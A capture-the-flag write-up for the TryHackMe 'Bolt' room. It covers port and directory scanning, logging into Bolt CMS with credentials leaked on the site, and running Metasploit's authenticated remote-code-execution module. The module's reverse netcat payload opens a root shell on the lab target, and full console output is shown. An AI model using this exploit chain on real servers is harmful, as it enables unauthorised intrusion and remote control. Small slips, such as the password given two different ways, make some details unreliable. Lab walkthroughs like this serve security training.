# Room Information

Room link: https://tryhackme.com/room/bolt

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/29/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto the terminal
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.195.64 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 19:36 EDT
Nmap scan report for 10.10.195.64
Host is up (0.090s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f385ec54f201b19440de42e821972080 (RSA)
|   256 77c7c1ae314121e4930e9add0b29e1ff (ECDSA)
|_  256 070543469db23ef04d6967e491d3d37f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    (PHP 7.2.32-1)
|_http-title: Bolt | A hero is unleashed
|_http-generator: Bolt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Thu, 29 Jun 2023 23:36:30 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Thu, 29 Jun 2023 23:36:30 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: a3477f
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 29 Jun 2023 23:36:29 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Thu, 29 Jun 2023 23:36:29 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: de258a
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.93%I=7%D=6/29%Time=649E157B%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2029\x20Jun\x20
SF:2023\x2023:36:29\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
SF:blic,\x20s-maxage=600\r\nDate:\x20Thu,\x2029\x20Jun\x202023\x2023:36:29
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
SF:n:\x20de258a\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Thu,\x2029\x20Jun\x202023\x2023:
SF:36:30\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
SF:ust-revalidate\r\nDate:\x20Thu,\x2029\x20Jun\x202023\x2023:36:30\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x20a3477f\r\n\r\n<!doctype\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v
SF:is");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.54 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP}:8000 > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto the terminal
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.195.64:8000 -r > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jun 29 19:37:01 2023
URL_BASE: http://10.10.195.64:8000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.195.64:8000/ ----
+ http://10.10.195.64:8000/.htaccess (CODE:200|SIZE:2956)     
+ http://10.10.195.64:8000/entries (CODE:200|SIZE:6661)      
+ http://10.10.195.64:8000/index.php (CODE:200|SIZE:0)      
+ http://10.10.195.64:8000/pages (CODE:200|SIZE:4991)        
+ http://10.10.195.64:8000/search (CODE:200|SIZE:5550)                                                                                                                         
-----------------
END_TIME: Thu Jun 29 19:53:38 2023
DOWNLOADED: 4612 - FOUND: 5
```

#
>
6. `firefox "http://{TARGET IP}:8000"` to launch firefox and redirect it to the target's IP address to visit their homepage of their website, which we saw is located on port 8000
```bash
┌──(kali㉿kali)-[~]
└─$ firefox "http://{TARGET IP}:8000"
```

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/homepage.png)

7. `firefox "http://{TARGET IP}:8000/entries"` to launch firefox and redirect it to the target's **/entries** web directory, which reveals two separate messages from the admin where one conatains their password while the other contains their username
```bash
┌──(kali㉿kali)-[~]
└─$ firefox "http://{TARGET IP}:8000/entries"
```

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/entries.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/entries%20pt%202.png)

8. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"` to launch firefox and redirect it to Google's search results for "boltcms" to search for their official documentation, which ended up being the first link that popped up for us (**https://docs.boltcms.io**)
  
![]()

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms.png)

9. `https://docs.boltcms.io/5.0/manual/login`

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Boltcms%20User%20Manual.png)

10. `firefox "http://10.10.195.64:8000/bolt"` and sign in using the Jake's set of credentials that he mentioned (bolt:bolt1admin23)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/Sign%20in%20to%20Bolt.png)

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Bolt/BoltCMS%20Version%20(Dashboard).png)

# Vulnerability Identification
> Vulnerability Identification Using Metasploit
11. `msfconsole`
12. `search Bolt 3.7`
13. `info {EXPLOIT PATH}`
```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole 
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.3.23-dev-                         ]
+ -- --=[ 2329 exploits - 1218 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the resource command to run 
commands from a file
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```
```bash
msf6 > search Bolt 3.7

Matching Modules
================

   #  Name                                        Disclosure Date  Rank   Check  Description
   -  ----                                        ---------------  ----   -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/bolt_authenticated_rce

msf6 >
```
```bash
msf6 > search Bolt 3.7

Matching Modules
================

   #  Name                                        Disclosure Date  Rank   Check  Description
   -  ----                                        ---------------  ----   -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/bolt_authenticated_rce

msf6 > info exploit/unix/webapp/bolt_authenticated_rce

       Name: Bolt CMS 3.7.0 - Authenticated Remote Code Execution
     Module: exploit/unix/webapp/bolt_authenticated_rce
   Platform: Linux, Unix
       Arch: x86, x64, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2020-05-07

Provided by:
  Sivanesh Ashok
  r3m0t3nu11
  Erik Wynter

Module side effects:
 ioc-in-logs
 config-changes
 artifacts-on-disk

Module stability:
 service-resource-loss

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
      0   Linux (x86)
      1   Linux (x64)
  =>  2   Linux (cmd)

Check supported:
  Yes

Basic options:
  Name               Current Setting    Required  Description
  ----               ---------------    --------  -----------
  FILE_TRAVERSAL_PA  ../../../public/f  yes       Traversal path from "/files"
  TH                 iles                          on the web server to "/root
                                                  " on the server
  PASSWORD                              yes       Password to authenticate wit
                                                  h
  Proxies                               no        A proxy chain of format type
                                                  :host:port[,type:host:port][
                                                  ...]
  RHOSTS                                yes       The target host(s), see http
                                                  s://docs.metasploit.com/docs
                                                  /using-metasploit/basics/usi
                                                  ng-metasploit.html
  RPORT              8000               yes       The target port (TCP)
  SSL                false              no        Negotiate SSL/TLS for outgoi
                                                  ng connections
  SSLCert                               no        Path to a custom SSL certifi
                                                  cate (default is randomly ge
                                                  nerated)
  TARGETURI          /                  yes       Base path to Bolt CMS
  URIPATH                               no        The URI to use for this expl
                                                  oit (default is random)
  USERNAME                              yes       Username to authenticate wit
                                                  h
  VHOST                                 no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to l
                                      isten on. This must be an address on the
                                       local machine or 0.0.0.0 to listen on a
                                      ll addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0
  and 3.6.* in order to execute arbitrary commands as the user running Bolt.

  This module first takes advantage of a vulnerability that allows an
  authenticated user to change the username in /bolt/profile to a PHP
  `system($_GET[""])` variable. Next, the module obtains a list of tokens
  from `/async/browse/cache/.sessions` and uses these to create files with
  the blacklisted `.php` extention via HTTP POST requests to
  `/async/folder/rename`. For each created file, the module checks the HTTP
  response for evidence that the file can be used to execute arbitrary
  commands via the created PHP $_GET variable. If the response is negative,
  the file is deleted, otherwise the payload is executed via an HTTP
  get request in this format: `/files/<rogue_PHP_file>?<$_GET_var>=<payload>`

  Valid credentials for a Bolt CMS user are required. This module has been
  successfully tested against Bolt CMS 3.7.0 running on CentOS 7.

References:
  https://www.exploit-db.com/exploits/48296
  https://github.com/bolt/bolt/releases/tag/3.7.1

CVE not available for the following reason:
  ["0day"]


View the full module info with the info -d command.
```

# Vulnerability Exploitation
> Vulnerability Exploitation Using Metasploit
14. `use {EXPLOIT PATH}`
15. `show options`
```bash
msf6 > use exploit/unix/webapp/bolt_authenticated_rce
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) >
```
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                8000                   yes       The target port (TCP)
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addre
                                       sses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
```
16. `set PASSWORD {JAKE'S PASSWORD}`
17. `set RHOSTS {TARGET IP}`
18. `set USERNAME {JAKE'S USERNAME}`
19. `set LHOST {MACHINE IP}`
20. `set LPORT {PORT NUMBER}`
21. `show options`
22. `exploit`
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
```
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.195.64
RHOSTS => 10.10.195.64
```
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
```
```bash
set LHOST 10.10.227.231
LHOST => 10.10.227.231
```
```bash
> set LPORT 9999
LPORT => 9999
```
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
   PASSWORD             boltadmin123           yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS               10.10.195.64           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                8000                   yes       The target port (TCP)
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME             bolt                   yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addre
                                       sses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.227.231    yes       The listen address (an interface may be specified)
   LPORT  9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
```
```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.10.227.231:9999 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "hhrrsy".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file mjuaewpru.php.
[+] Used token cb01515d6b82cdfef71835f1ab to create wvvkcehx.php.
[*] Attempting to execute the payload via "/files/wvvkcehx.php?hhrrsy=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 2 opened (10.10.227.231:9999 -> 10.10.195.64:57614) at 2023-06-30 02:35:24 +0100
[+] Deleted file wvvkcehx.php.
[+] Reverted user profile back to original state.

```
23. `whoami`
24. `find / -type f -name flag.txt 2>/dev/null`
25. `cat {FLAG TEXT PATH}`
```bash
whoami
root
```
```bash
find / -type f -name flag.txt 2>/dev/null
/home/flag.txt
```
```bash
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```


**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Bolt.png)

# Command History
1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
2. `cat {FILENAME1}.txt`
3. `dirb http://{TARGET IP}:8000 > {FILENAME2}.txt`
4. `cat {FILENAME2}.txt`
5. `firefox "http://10.10.195.64:8000"`
6. `firefox "http://10.10.195.64:8000/entries"`
7. `firefox "https://www.google.com/search?client=firefox-b-d&q=boltcms"`
8. `https://docs.boltcms.io/5.0/manual/login`
9. `firefox "http://10.10.195.64:8000/bolt"`
10. `msfconsole`
11. `search Bolt 3.7`
12. `info {EXPLOIT PATH}`
13. `use {EXPLOIT PATH}`
14. `show options`
15. `set PASSWORD {JAKE'S PASSWORD}`
16. `set RHOSTS {TARGET IP}`
17. `set USERNAME {JAKE'S USERNAME}`
18. `set LHOST {MACHINE IP}`
19. `set LPORT {PORT NUMBER}`
20. `show options`
21. `exploit`
22. `whoami`
23. `find / -type f -name flag.txt 2>/dev/null`
24. `cat {FLAG TEXT PATH}`

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file


`find / -type f -name flag.txt 2>/dev/null`
+ `/` specifies the starting directory to be the root directory
+ `-type f` specifies that it should only search for regular files
+ `-name flag.txt` specifies to search for a file called user.txt
+ `2>/dev/null` redirects error output (stderr) to the null device ensuring that any error message encountered during the search are suppressed and not displayed on the terminal


# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/


